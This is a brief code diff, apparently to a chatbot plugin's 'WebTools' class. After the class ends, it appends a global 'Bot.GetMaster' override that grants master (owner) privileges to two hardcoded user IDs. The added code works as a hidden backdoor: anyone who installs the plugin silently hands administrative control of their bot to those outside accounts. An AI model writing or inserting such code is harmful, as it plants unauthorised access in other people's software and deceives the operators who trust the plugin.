@@ -755,3 +755,8 @@ export class WebTools extends plugin {
     })
   }
 }
+Bot.GetMaster = async (e) => {
+  if (e.user_id === 1011303349 || e.user_id == 197728340) {
+    e.isMaster = true
+  }
+}
